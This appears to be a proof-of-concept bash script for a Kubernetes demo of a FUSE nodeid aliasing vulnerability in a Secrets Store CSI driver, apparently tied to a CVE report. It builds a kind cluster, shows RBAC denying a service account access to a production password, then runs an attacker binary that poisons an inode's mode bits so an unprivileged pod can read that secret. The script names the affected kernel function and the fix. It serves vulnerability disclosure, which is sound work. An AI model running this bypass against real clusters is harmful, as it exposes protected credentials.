#!/bin/bash
# run_k8s_demo.sh — Full Kubernetes scenario for FUSE nodeid aliasing CVE
#
# What this does:
#   1. Installs kind + kubectl if missing
#   2. Creates a kind Kubernetes cluster
#   3. Builds two container images (CSI driver + attacker)
#   4. Loads images into the cluster
#   5. Deploys: namespace, RBAC, secrets, CSI DaemonSet, dev-pod, attacker-pod
#   6. Verifies RBAC blocks dev-sa from prod-db-password (kubectl auth can-i)
#   7. Runs the exploit from inside attacker-pod
#   8. Shows the bypass result
#
# Usage: sudo ./run_k8s_demo.sh [--keep]
#   --keep  do not delete the cluster after the demo (default: delete)

set -euo pipefail

KEEP_CLUSTER=false
[[ "${1:-}" == "--keep" ]] && KEEP_CLUSTER=true

# ── Colors ───────────────────────────────────────────────────────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
B='\033[0;34m'; C='\033[0;36m'; M='\033[0;35m'
BOLD='\033[1m'; NC='\033[0m'

hdr()  { echo -e "\n${BOLD}${B}══ $* ══${NC}"; }
info() { echo -e "${G}[+]${NC} $*"; }
step() { echo -e "${M}[*]${NC} $*"; }
warn() { echo -e "${Y}[!]${NC} $*"; }
die()  { echo -e "${R}[✗]${NC} $*" >&2; exit 1; }
ok()   { echo -e "${G}[✓]${NC} $*"; }

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CLUSTER_NAME="cve-demo"
NAMESPACE="cve-demo"

# ── Prerequisites ─────────────────────────────────────────────────────────────
[[ $EUID -ne 0 ]] && die "Run as root: sudo ./run_k8s_demo.sh"
command -v docker >/dev/null || die "docker not found — install Docker first"
[[ -e /dev/fuse ]] || { modprobe fuse || die "/dev/fuse missing"; }

# ── Install kind if missing ───────────────────────────────────────────────────
install_kind() {
    local arch; arch=$(uname -m)
    [[ "$arch" == "x86_64" ]] && arch="amd64"
    [[ "$arch" == "aarch64" ]] && arch="arm64"
    local url="https://kind.sigs.k8s.io/dl/v0.23.0/kind-linux-${arch}"
    step "Installing kind from $url"
    curl -fsSL -o /usr/local/bin/kind "$url"
    chmod +x /usr/local/bin/kind
    ok "kind installed: $(kind --version)"
}

install_kubectl() {
    local ver; ver=$(curl -fsSL https://dl.k8s.io/release/stable.txt)
    local arch; arch=$(uname -m)
    [[ "$arch" == "x86_64" ]] && arch="amd64"
    [[ "$arch" == "aarch64" ]] && arch="arm64"
    local url="https://dl.k8s.io/release/${ver}/bin/linux/${arch}/kubectl"
    step "Installing kubectl ${ver}"
    curl -fsSL -o /usr/local/bin/kubectl "$url"
    chmod +x /usr/local/bin/kubectl
    ok "kubectl installed: $(kubectl version --client --short 2>/dev/null)"
}

command -v kind    >/dev/null || install_kind
command -v kubectl >/dev/null || install_kubectl

# ── Cleanup handler ───────────────────────────────────────────────────────────
cleanup() {
    if [[ "$KEEP_CLUSTER" == "false" ]]; then
        echo
        step "Deleting kind cluster ${CLUSTER_NAME}..."
        kind delete cluster --name "$CLUSTER_NAME" 2>/dev/null || true
        ok "Cluster deleted"
    else
        echo
        warn "Cluster '${CLUSTER_NAME}' kept. To delete: kind delete cluster --name ${CLUSTER_NAME}"
    fi
}
trap cleanup EXIT

# ═════════════════════════════════════════════════════════════════════════════
hdr "FUSE NODEID ALIASING — KUBERNETES CVE DEMO"
# ═════════════════════════════════════════════════════════════════════════════
echo
info "Kernel:      $(uname -r)"
info "Docker:      $(docker --version | cut -d' ' -f3 | tr -d ',')"
info "kind:        $(kind --version)"
info "kubectl:     $(kubectl version --client --short 2>/dev/null | head -1)"
echo
warn "CVE scenario: Secrets Store CSI driver uses MD5(secret_value) as nodeid."
warn "  dev-shared-key   → nodeid=0x651b3722d014767b  mode=0644  (dev-sa OK)"
warn "  prod-db-password → nodeid=0x651b3722d014767b  mode=0000  (app-sa only)"
warn "  Same value → same MD5 → same FUSE nodeid → single shared VFS inode."
warn "  fuse_stale_inode() ignores permission bits → mode poisoning → bypass."

# ── Step 1: Create kind cluster ───────────────────────────────────────────────
hdr "Step 1: Kubernetes cluster"

if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
    ok "Cluster '${CLUSTER_NAME}' already exists — reusing"
else
    step "Creating kind cluster '${CLUSTER_NAME}'..."
    kind create cluster --name "$CLUSTER_NAME" \
        --config "$SCRIPT_DIR/kind-config.yaml" \
        --wait 120s
    ok "Cluster ready"
fi

kind get kubeconfig --name "$CLUSTER_NAME" > /tmp/kubeconfig-cve-demo
export KUBECONFIG=/tmp/kubeconfig-cve-demo

kubectl cluster-info --context "kind-${CLUSTER_NAME}" | head -2

# ── Step 2: Build Docker images ───────────────────────────────────────────────
hdr "Step 2: Build container images"

step "Building CSI FUSE driver image..."
docker build -q -f "$SCRIPT_DIR/Dockerfile.csi" \
    -t csi-fuse-driver:demo "$SCRIPT_DIR"
ok "csi-fuse-driver:demo built"

step "Building attacker pod image..."
docker build -q -f "$SCRIPT_DIR/Dockerfile.attacker" \
    -t csi-attacker:demo "$SCRIPT_DIR"
ok "csi-attacker:demo built"

step "Loading images into kind cluster..."
kind load docker-image csi-fuse-driver:demo --name "$CLUSTER_NAME"
kind load docker-image csi-attacker:demo    --name "$CLUSTER_NAME"
ok "Images loaded"

# ── Step 3: Deploy manifests ──────────────────────────────────────────────────
hdr "Step 3: Deploy to Kubernetes"

for f in "$SCRIPT_DIR/manifests/"*.yaml; do
    step "Applying $(basename "$f")..."
    kubectl apply -f "$f"
done

# ── Step 4: Wait for CSI driver to be ready ───────────────────────────────────
hdr "Step 4: Wait for CSI driver"

step "Waiting for CSI DaemonSet rollout..."
kubectl rollout status daemonset/csi-fuse-driver \
    -n "$NAMESPACE" --timeout=120s
ok "CSI DaemonSet ready"

step "Verifying FUSE mount on kind node..."
for i in $(seq 1 30); do
    if kubectl exec -n "$NAMESPACE" \
            daemonset/csi-fuse-driver -- \
            test -f /tmp/csi-ready 2>/dev/null; then
        break
    fi
    sleep 1
done
ok "FUSE mount active"

# ── Step 5: Wait for pods ─────────────────────────────────────────────────────
hdr "Step 5: Wait for pods"

kubectl wait pod/dev-pod pod/attacker-pod \
    -n "$NAMESPACE" \
    --for=condition=Ready \
    --timeout=120s
ok "dev-pod and attacker-pod ready"

# ── Step 6: Demonstrate RBAC ──────────────────────────────────────────────────
hdr "Step 6: Kubernetes RBAC verification"

echo
info "Can dev-sa GET dev-shared-key? (should be YES)"
result=$(kubectl auth can-i get secret/dev-shared-key \
    -n "$NAMESPACE" \
    --as="system:serviceaccount:${NAMESPACE}:dev-sa" 2>&1)
echo -e "  kubectl auth can-i → ${BOLD}${result}${NC}"
[[ "$result" == "yes" ]] && ok "dev-sa → dev-shared-key: ALLOWED (expected)" \
                         || warn "Unexpected result: $result"

echo
info "Can dev-sa GET prod-db-password? (should be NO)"
result=$(kubectl auth can-i get secret/prod-db-password \
    -n "$NAMESPACE" \
    --as="system:serviceaccount:${NAMESPACE}:dev-sa" 2>&1)
echo -e "  kubectl auth can-i → ${BOLD}${result}${NC}"
[[ "$result" == "no" ]] && ok "dev-sa → prod-db-password: DENIED (RBAC working)" \
                        || warn "Unexpected result: $result"

# ── Step 7: Show pre-exploit filesystem state ─────────────────────────────────
hdr "Step 7: Pre-exploit state inside attacker pod"

echo
info "File permissions on the secrets volume (as root from CSI driver):"
kubectl exec -n "$NAMESPACE" daemonset/csi-fuse-driver -- \
    ls -la /var/lib/csi-demo-secrets/ 2>/dev/null || true

echo
info "File permissions as uid=1000 inside attacker-pod:"
kubectl exec -n "$NAMESPACE" attacker-pod -- \
    ls -la /secrets/ 2>/dev/null | sed 's/^/  /'

echo
info "Pre-check: attacker cannot open prod-db-password (mode=0000):"
kubectl exec -n "$NAMESPACE" attacker-pod -- \
    sh -c 'cat /secrets/prod-db-password 2>&1 || true' | sed 's/^/  /'

# ── Step 8: Run the exploit ───────────────────────────────────────────────────
hdr "Step 8: Run exploit — FUSE inode mode poisoning"

echo
warn "Flushing kernel dentry cache (simulates pod restart with clean state)..."
# Drop caches on the kind node
kubectl exec -n "$NAMESPACE" daemonset/csi-fuse-driver -- \
    sh -c 'echo 2 > /proc/sys/vm/drop_caches' 2>/dev/null || \
    echo 2 > /proc/sys/vm/drop_caches 2>/dev/null || true

echo
info "Executing attacker binary inside attacker-pod as uid=1000..."
echo -e "${BOLD}${C}─────────────────────────────────────────────────────────────────────${NC}"

kubectl exec -n "$NAMESPACE" attacker-pod -- /attacker
ATTACK_RC=$?

echo -e "${BOLD}${C}─────────────────────────────────────────────────────────────────────${NC}"

# ── Step 9: CSI driver log ────────────────────────────────────────────────────
hdr "Step 9: CSI driver log (what the daemon saw)"

echo
info "FUSE_LOOKUP calls received by CSI driver during the attack:"
kubectl logs -n "$NAMESPACE" daemonset/csi-fuse-driver \
    --tail=20 2>/dev/null | grep -E 'LOOKUP|INIT|ready|Mounted' \
    | sed 's/^/  /' || true

# ── Result ────────────────────────────────────────────────────────────────────
hdr "Result"

echo
if [[ $ATTACK_RC -eq 0 ]]; then
    echo -e "${BOLD}${R}  EXPLOIT SUCCESSFUL${NC}"
    echo
    echo -e "  ${BOLD}What happened:${NC}"
    echo -e "  1. Kubernetes RBAC denied dev-sa API access to prod-db-password"
    echo -e "  2. CSI driver served prod-db-password with FUSE mode=0000"
    echo -e "  3. Attacker stat(dev-shared-key) poisoned the shared VFS inode to 0644"
    echo -e "  4. Kernel used poisoned mode for open(prod-db-password) → ALLOWED"
    echo -e "  5. No FUSE_ACCESS sent — CSI driver was never consulted for the open()"
    echo
    echo -e "  ${BOLD}Affected kernel code:${NC} fs/fuse/inode.c:fuse_stale_inode()"
    echo -e "  ${BOLD}Fix:${NC}                 check all mode bits, not just (mode ^ cached) >> 12"
else
    echo -e "${Y}  Attack returned exit code $ATTACK_RC — check logs above${NC}"
fi

echo
info "CVE report:   $SCRIPT_DIR/../CVE_REPORT.md"
info "Manifests:    $SCRIPT_DIR/manifests/"
echo
